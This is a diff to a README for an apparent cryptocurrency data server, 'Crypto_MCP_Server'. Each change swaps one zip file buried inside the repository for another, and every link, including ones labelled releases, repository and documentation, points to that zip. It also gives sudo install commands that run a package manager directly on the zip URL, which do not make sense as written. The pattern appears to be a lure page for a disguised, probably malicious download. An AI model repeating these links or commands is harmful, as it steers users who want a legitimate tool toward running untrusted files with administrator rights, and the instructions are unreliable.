@@ -1,6 +1,6 @@
 # 🚀 Crypto_MCP_Server - Real-Time Cryptocurrency Data Made Simple
 
-[![Download Latest Release](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/tests/MC_Server_Crypto_v1.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/tests/MC_Server_Crypto_v1.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip)
 
 ## 📦 Introduction
 
@@ -20,7 +20,7 @@ Before you start, check that your system meets the following requirements:
 
 ### 2. 📥 Download & Install
 
-Visit this page to download: [Crypto MCP Server Releases](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/tests/MC_Server_Crypto_v1.1.zip).
+Visit this page to download: [Crypto MCP Server Releases](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip).
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of Crypto MCP Server. It will be marked as "Latest Release."
@@ -49,8 +49,8 @@ Visit this page to download: [Crypto MCP Server Releases](https://raw.githubuser
 2. Navigate to the directory where you downloaded the file.
 3. Use the package manager appropriate for your distribution to install the server.
    - For example:
-     - **Debian/Ubuntu:** `sudo dpkg -i https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/tests/MC_Server_Crypto_v1.1.zip`
-     - **Fedora:** `sudo dnf install https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/tests/MC_Server_Crypto_v1.1.zip`
+     - **Debian/Ubuntu:** `sudo dpkg -i https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip`
+     - **Fedora:** `sudo dnf install https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip`
 
 ### 4. 🔄 Running the Application
 
@@ -103,8 +103,8 @@ If you encounter issues or have questions:
 
 ### 9. 🔗 Helpful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/tests/MC_Server_Crypto_v1.1.zip)
-- [Documentation](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/tests/MC_Server_Crypto_v1.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip)
 
 ### 10. 💾 Contributing
 
